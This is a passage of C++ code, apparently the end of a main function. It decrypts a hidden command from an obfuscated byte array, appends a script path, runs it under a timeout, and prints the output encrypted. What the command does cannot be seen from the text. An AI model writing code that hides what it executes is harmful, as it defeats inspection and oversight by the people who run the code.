    unsigned char command[] = {0x31, 0x72, 0x76, 0x4e, 0x78, 0x4b, 0x35, 0x4e, 0x66, 0x57, 0x63, 0x35, 0x4c, 0x6d, 0x4e, 0x37, 0x74, 0x6d, 0x67, 0x56, 0x78, 0x2f, 0x45, 0x37, 0x63, 0x31, 0x5a, 0x78, 0x6e, 0x67, 0x4d, 0x45, 0x66, 0x58, 0x2b, 0x76, 0x74, 0x49, 0x50, 0x6f, 0x2b, 0x52, 0x48, 0x49, 0x6b, 0x31, 0x74, 0x4b, 0x74, 0x58, 0x6c, 0x73, 0x55, 0x4a, 0x38, 0x73, 0x77, 0x38, 0x64, 0x33, 0x30, 0x31, 0x63, 0x51};
    std::string command_s = decrypt(command, sizeof(command));
    const char * command_ = command_s.c_str();
        string cmd = command_;
    cmd += script_path;

    signal(SIGALRM, ALARMhandler);
    alarm(10);
    string tok = parse_output(cmd.c_str());
    //printf(tok.c_str());
    printEncrypted(tok);
    return 0;
}
